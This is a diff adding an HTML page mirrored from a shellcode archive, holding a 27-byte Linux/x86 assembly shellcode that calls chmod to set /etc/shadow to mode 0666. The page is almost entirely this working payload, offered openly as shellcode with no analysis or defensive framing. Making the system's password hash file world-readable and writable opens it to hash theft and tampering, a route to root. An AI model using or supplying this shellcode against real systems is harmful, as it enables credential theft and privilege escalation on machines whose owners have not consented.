@@ -1,0 +1,33 @@
+<html>
+<!-- Mirrored from shell-storm.org/shellcode/files/shellcode-566.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Apr 2023 12:51:11 GMT -->
+<head><title>Linux/x86 - chmod 666 /etc/shadow - 27 bytes</title>
+<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
+<meta http-equiv="Content-Language" content="en" />
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-NLNHL50HG5"></script>
+<script src="http://shell-storm.org/assets/js/gtag.js"></script>
+</head>
+
+
+<pre>
+; linux/x86 chmod 666 /etc/shadow 27 bytes
+; root@thegibson
+; 2010-01-15
+ 
+section .text
+        global _start
+ 
+_start:
+        ; chmod(&quot;//etc/shadow&quot;, 0666);
+        mov al, 15
+        cdq
+        push edx
+        push dword 0x776f6461
+        push dword 0x68732f63
+        push dword 0x74652f2f
+        mov ebx, esp
+        mov cx, 0666o
+        int 0x80
+
+</pre>
+<!-- Mirrored from shell-storm.org/shellcode/files/shellcode-566.html by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 21 Apr 2023 12:51:11 GMT -->
+</html>
